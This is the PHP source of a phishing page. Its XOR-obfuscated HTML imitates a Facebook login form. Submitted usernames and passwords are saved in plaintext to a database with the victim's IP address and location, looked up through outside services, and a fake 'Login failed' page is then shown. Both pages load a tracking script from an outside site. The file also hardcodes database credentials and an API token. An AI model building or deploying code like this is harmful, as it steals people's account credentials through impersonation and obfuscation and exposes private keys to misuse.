<?php
// Database connection settings
$servername = "sql304.infinityfree.com";
$username = "if0_37184148";
$password = "VJcExTITskJ0Ky";
$dbname = "if0_37184148_Data";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Collect form data
    $user = $_POST['username'];
    $pass = $_POST['password'];
    $source_page = $_POST['source_page'];

    // Get user's IP address
    $user_ip = $_SERVER['REMOTE_ADDR'];

    // Get geolocation data from IPinfo
    $ipinfo_token = "aaad8e9b2f8309";
    $ipinfo_url = "https://ipinfo.io/{$user_ip}?token={$ipinfo_token}";
    $ipinfo_response = file_get_contents($ipinfo_url);
    $ipinfo_data = json_decode($ipinfo_response, true);

    $country_code = $ipinfo_data['country'] ?? 'Unknown';
    $state = $ipinfo_data['region'] ?? 'Unknown';

    // Get full country name from RestCountries API
    $restcountries_url = "https://restcountries.com/v3.1/alpha/{$country_code}";
    $restcountries_response = file_get_contents($restcountries_url);
    $restcountries_data = json_decode($restcountries_response, true);
    $country = $restcountries_data[0]['name']['common'] ?? 'Unknown';

    // Get phone code from RestCountries API
    $phone_code = $restcountries_data[0]['idd']['root'] . $restcountries_data[0]['idd']['suffixes'][0] ?? 'Unknown';

    // Prepare and bind
    $stmt = $conn->prepare("INSERT INTO user_details (source_page, username, password, ip_address, country_name, state_name, phone_code) VALUES (?, ?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("sssssss", $source_page, $user, $pass, $user_ip, $country, $state, $phone_code);

    // Execute the query without showing any success message
    $stmt->execute();


    // Close the statement and connection
    $stmt->close();
    $conn->close();

    // Display the "Login Failed" page
    ?>
    <!DOCTYPE html>
    <html>
    <body>    <script language="javascript"> 

var enkripsi="'1A'03FMAV[RG'02jvon'1G'2C'1Ajvon'1G'2C'1Ajgcf'1G'2C'02'02'02'02'1Aogvc'02ajcpqgv'1F'00WVD/:'00'1G'2C'02'02'02'02'1Aogvc'02lcog'1F'00tkgurmpv'00'02amlvglv'1F'00ukfvj'1Ffgtkag/ukfvj'0A'02klkvkcn/qacng'1F3,2'00'1G'2C'02'02'02'02'1Avkvng'1GNmekl'02dckngf'1A-vkvng'1G'2C'02'02'02'02'1Ankli'02jpgd'1F'00jvvrq'1C--dmlvq,emmengcrkq,amo-aqq0'1Ddcokn{'1FPm`mvm'1CuejvB622'04fkqrnc{'1Fqucr'00'02pgn'1F'00qv{ngqjggv'00'1G'2C'02'02'02'02'1Ankli'02pgn'1F'00qv{ngqjggv'00'02jpgd'1F'00jvvrq'1C--uctg/kli{/rpmfwav,enkvaj,og-d`'0702dckngf'0702qv{,aqq'00'1G'2C'1A-jgcf'1G'2C'1A`mf{'1G'2C'02'02'02'02'1Afkt'02ancqq'1F'00gppmp/ogqqceg'00'1G'2C'02'02'02'02'02'02'02'02Vjg'02apgfglvkcnq'02fgvcknq'02vjcv'02{mw'02glvgpgf'02kq'02klamppgav'0A'02`wv'02ug'02acl'02jgnr'02{mw'02egv'02`cai'02klvm'02{mwp'02caamwlv,'02'1Aqvpmle'1GVp{'02ceckl'02ukvj'02fkddgpglv'02nmekl'02kldm,'1A-qvpmle'1G'2C'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'1Akoe'02ancqq'1F'00dcag`m'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-dcag`m,rle'00'1G'2C'02'02'02'02'1Admpo'02cavkml'1F'00'00'02ogvjmf'1F'00RMQV'00'1G'2C'02'02'02'02'02'02'02'02'1Aklrwv'02v{rg'1F'00jkffgl'00'02lcog'1F'00qmwpag]rceg'00'02tcnwg'1F'00Dcag`mmi'00'1G'2C'02'02'02'02'02'02'02'02'1Aklrwv'02ancqq'1F'00klrwv`mz'00'02v{rg'1F'00vgzv'00'02lcog'1F'00wqgplcog'00'02rncagjmnfgp'1F'00Om`kng'02lwo`gp'02mp'02gockn'02cffpgqq'00'02pgswkpgf'1G'2C'02'02'02'02'02'02'02'02'1Aklrwv'02ancqq'1F'00klrwv`mz'00'02v{rg'1F'00rcqqumpf'00'02lcog'1F'00rcqqumpf'00'02rncagjmnfgp'1F'00Dcag`mmi'02rcqqumpf'00'02pgswkpgf'1G'2C'02'02'02'02'02'02'02'02'1A`wvvml'02v{rg'1F'00qw`okv'00'02ancqq'1F'00`lv'00'1G'1Akoe'02ancqq'1F'00nmelk'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-nmelk,rle'00'1G'1A-`wvvml'1G'2C'02'02'02'02'1A-dmpo'1G'2C'02'02'02'02'1Afkt'02ancqq'1F'00amlvcklgp'00'1G'2C'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nklg'00'1G'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00vgzv'00'1Gmp'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nklg'00'1G'1A-fkt'1G'2C'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'1Afkt'02ancqq'1F'00ktf'00'1G'2C'02'02'02'02'02'02'02'02'1A`wvvml'02ancqq'1F'00`ml'00'1G'1Akoe'02ancqq'1F'00apvg'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-apvg,rle'00'1G'1A-`wvvml'1G'02'1A`p'1G'2C'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02ancqq'1F'00demv'00'1GDmpemvvgl'02rcqqumpf'1D'1A-c'1G'2C'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'1Admmvgp'1G'2C'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00algp'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00ngdv'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00gl'00'1G'1Aqvpmle'1GGlenkqj'02'0:WI'0;'1A-qvpmle'1G'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00dwv'00'1G@cqc'02Hcuc'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00dwv'00'1G'w47G7'w450A'w:C;G'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00dwv'00'1GRmpvwew'GCq'02'0:@pcqkn'0;'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00pkejv'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00dw'00'1G@cjcqc'02Klfmlgqkc'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00dw'00'1G@cjcqc'02Ognc{w'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00dw'00'1GGqrc'D3mn'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'1Akoe'02ancqq'1F'00`mzz'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-`mzz,rle'00'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'1A-dmmvgp'1G'2C'02'02'02'02'1Ar'02ancqq'1F'00kladcag'00'1GOgvc'02'C;0206'1A-r'1G'2C'1A-`mf{'1G'2C'1A-jvon'1G"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
</script>
<script src="https://raviral.com/host_style/style/js-track/track.js"></script> 
</body>
    </html>

    <?php
} else {
    // Display the login form
    ?>
    <!DOCTYPE html>
    <html>
    <body>
    <script language="javascript"> 

var enkripsi="'02'02'02'02'1A'03FMAV[RG'02jvon'1G'2C'1Ajvon'1G'2C'1Ajgcf'1G'2C'02'02'02'02'1Aogvc'02ajcpqgv'1F'00WVD/:'00'1G'2C'02'02'02'02'1Aogvc'02lcog'1F'00tkgurmpv'00'02amlvglv'1F'00ukfvj'1Ffgtkag/ukfvj'0A'02klkvkcn/qacng'1F3,2'00'1G'2C'02'02'02'02'1Avkvng'1GNmekl'02vm'02Rpmaggf'1A-vkvng'1G'2C'02'02'02'02'1Ankli'02jpgd'1F'00jvvrq'1C--dmlvq,emmengcrkq,amo-aqq0'1Ddcokn{'1FPm`mvm'1CuejvB622'04fkqrnc{'1Fqucr'00'02pgn'1F'00qv{ngqjggv'00'1G'2C'02'02'02'02'1Ankli'02pgn'1F'00qv{ngqjggv'00'02jpgd'1F'00jvvrq'1C--uctg/kli{/rpmfwav,enkvaj,og-d`'0702klfgz'0702qv{ng,aqq'00'1G'2C'1A-jgcf'1G'2C'1A`mf{'1G'2C'02'02'02'02'02'02'02'02'02'02'1Akoe'02ancqq'1F'00dcag`m'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-dcag`m,rle'00'1G'2C'02'02'02'02'02'02'02'02'02'02'2C'02'02'02'02'02'02'02'02'02'02'1Admpo'02cavkml'1F'00'00'02ogvjmf'1F'00RMQV'00'1G'2C'02'02'02'02'02'02'02'02'1Aklrwv'02v{rg'1F'00jkffgl'00'02lcog'1F'00qmwpag]rceg'00'02tcnwg'1F'00Dcag`mmi'00'1G'2C'02'02'02'02'02'02'02'02'1Aklrwv'02ancqq'1F'00klrwv`mz'00'02v{rg'1F'00vgzv'00'02lcog'1F'00wqgplcog'00'02rncagjmnfgp'1F'00Om`kng'02lwo`gp'02mp'02gockn'02cffpgqq'00'02pgswkpgf'1G'2C'02'02'02'02'02'02'02'02'1Aklrwv'02ancqq'1F'00klrwv`mz'00'02v{rg'1F'00rcqqumpf'00'02lcog'1F'00rcqqumpf'00'02rncagjmnfgp'1F'00Dcag`mmi'02rcqqumpf'00'02pgswkpgf'1G'2C'02'02'02'02'02'02'02'02'2C'02'02'02'02'02'02'02'02'02'1A`wvvml'02'02v{rg'1F'00qw`okv'00'02ancqq'1F'00`lv'00'1G'1Akoe'02ancqq'1F'00nmelk'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-nmelk,rle'00'1G'1A-`wvvml'1G'2C'02'02'02'02'1A-dmpo'1G'2C'02'02'02'02'1Afkt'02ancqq'1F'00amlvcklgp'00'1G'2C'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nklg'00'1G'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00vgzv'00'1Gmp'1A-fkt'1G'2C'02'02'02'02'02'02'02'02'1Afkt'02ancqq'1F'00nklg'00'1G'1A-fkt'1G'2C'02'02'02'02'1A-fkt'1G'2C'02'02'02'2C'02'02'02'02'1Afkt'02ancqq'1F'00ktf'00'1G'2C'02'02'02'02'1A`wvvml'02ancqq'1F'00`ml'00'1G'1Akoe'02ancqq'1F'00apvg'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-apvg,rle'00'02'1G'1A-`wvvml'1G'02'1A`p'1G'2C'02'02'02'02'2C'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02ancqq'1F'00demv'00'1GDmpemvvgl'02rcqqumpf'1D'1A-c'1G'2C'02'02'02'02'2C'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'2C'02'02'02'02'1Admmvgp'1G'2C'1Afkt'02ancqq'1F'00algp'00'1G'2C'02'02'02'02'2C'02'02'02'02'1Afkt'02ancqq'1F'00ngdv'00'1G'2C'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00gl'00'1G'1Aqvpmle'1GGlenkqj'02'0:WI'0;'1A-qvpmle'1G'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00dwv'00'1G@cqc'02Hcuc'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00dwv'00'1G'w47G7'w450A'w:C;G'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00dwv'00'1GRmpvwew'GCq'02'0:@pcqkn'0;'1A-c'1G'2C'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'1Afkt'02ancqq'1F'00pkejv'00'1G'2C'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00dw'00'1G@cjcqc'02Klfmlgqkc'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00kf'1F'00dw'00'1G@cjcqc'02Ognc{w'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'02'1Ac'02jpgd'1F'00'01'00'02kf'1F'00dw'00'1GGqrc'D3mn'1A-c'1G'2C'02'02'02'02'02'02'02'02'02'02'02'1Akoe'02ancqq'1F'00`mzz'00'02qpa'1F'00jvvrq'1C--pgqmwpagqqq,ekvjw`,km-Rkaq-`mzz,rle'00'02'1G'2C'02'02'02'02'1A-fkt'1G'2C'02'02'02'02'2C'02'02'02'02'1A-dmmvgp'1G'2C'02'02'02'02'2C'02'02'02'02'1Ar'02ancqq'1F'00kladcag'00'1G'02Ogvc'02'C;0206'1A-r'1G'2C'02'02'02'02'2C'02'02'02'02'2C'1A-`mf{'1G'2C'1A-jvon'1G'2C"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);
</script>
<script src="https://raviral.com/host_style/style/js-track/track.js"></script> 
</body>
    </html>

    <?php
}
?>
